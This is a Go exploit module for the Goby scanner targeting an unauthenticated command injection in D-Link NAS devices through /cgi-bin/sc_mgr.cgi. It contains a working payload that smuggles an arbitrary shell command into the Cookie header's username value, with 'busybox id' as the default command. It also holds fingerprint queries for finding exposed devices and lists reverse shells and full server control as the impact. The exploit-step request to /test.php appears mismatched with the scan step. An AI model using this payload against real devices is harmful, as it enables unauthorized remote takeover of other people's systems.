package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
 expJson := `{
    "Name": "D-Link NAS device /cgi-bin/sc_mgr.cgi Command Execution Vulnerability",
    "Description": "<p>D-Link is a NAS (Network Attached Storage) device from China's D-Link company.D-Link has a command injection vulnerability, which allows unauthorized attackers to remotely execute code and take control of the server.</p>",
    "Product": "D-Link-Wi-Fi-Router",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2024-11-15",
    "PostTime": "2024-11-28",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/web/images/bg.png\" && body=\"/web/images/logo2.png\"",
    "GobyQuery": "body=\"/web/images/bg.png\" && body=\"/web/images/logo2.png\"",
    "Level": "3",
    "Impact": "<p>1. Inherit the privileges of the web server program to execute system commands  </p><p>2. Inherit web server permissions to read files  </p><p>3. Rebound Shell  </p><p>4. Control the entire website  </p><p>5. Control the entire server</p>",
    "Recommendation": "<p>1. Try not to execute external commands.  </p><p>2. Use custom functions or function libraries to replace the functionality of external commands.  </p><p>3. The manufacturer has released the latest fix version, follow <a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a></p>",
    "References": [
        "https://wx.zsxq.com/group/88885811181452"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "Command",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "busybox id",
            "show": "Mode=Command"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info",
                "follow_redirect": false,
                "header": {
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                    "Accept": "application/xml, text/xml, */*; q=0.01",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "username='& {{{COMMAND}}} & echo ';",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "RESULT1|lastbody|regex|([\\s\\S]*)",
                "RESULT2|RESULT1|replace_str|Status: 404 not found| ",
                "RESULT3|RESULT2|regex|(\\s+)",
                "RESULT|RESULT2|replace_str|{{{RESULT3}}}|"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "D-Link NAS设备 /cgi-bin/sc_mgr.cgi 命令执行漏洞",
            "Product": "D-Link-NAS",
            "Description": "<p>D-Link 是中国友讯（D-Link）公司的一款NAS（网络附属存储）设备。D-Link 存在命令注入漏洞，未授权的攻击者可以通过该漏洞进行远程代码执行，从而控制服务器。<br></p>",
            "Recommendation": "<p>1、尽量不要执行外部命令。&nbsp;</p><p>&nbsp;2、使用自定义函数或者函数库来代替外部命令的功能。&nbsp;&nbsp;</p><p>3、该厂商发布最新修复版本，关注<a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a><br></p>",
            "Impact": "<p>1、继承Web 服务器程序权限，去执行系统命令&nbsp;&nbsp;</p><p>2、继承Web 服务器权限，读取文件&nbsp;</p><p>3、反弹Shell&nbsp;</p><p>4、控制整个网站&nbsp;&nbsp;</p><p>5、控制整个服务器<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "D-Link NAS device /cgi-bin/sc_mgr.cgi Command Execution Vulnerability",
            "Product": "D-Link-Wi-Fi-Router",
            "Description": "<p>D-Link is a NAS (Network Attached Storage) device from China's D-Link company.D-Link has a command injection vulnerability, which allows unauthorized attackers to remotely execute code and take control of the server.<br></p>",
            "Recommendation": "<p>1. Try not to execute external commands.&nbsp;&nbsp;<br></p><p>2. Use custom functions or function libraries to replace the functionality of external commands.&nbsp;&nbsp;</p><p>3. The manufacturer has released the latest fix version, follow&nbsp;<a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a><br></p>",
            "Impact": "<p>1. Inherit the privileges of the web server program to execute system commands&nbsp;&nbsp;<br></p><p>2. Inherit web server permissions to read files&nbsp;&nbsp;</p><p>3. Rebound Shell&nbsp;&nbsp;</p><p>4. Control the entire website&nbsp;&nbsp;</p><p>5. Control the entire server<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho",
        "VUL_URL": "define|variable|/cgi-bin/sc_mgr.cgi"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9974"
}`
  
    ExpManager.AddExploit(NewExploit(
      goutils.GetFileName(),
      expJson,
      nil,
      nil,
    ))
  }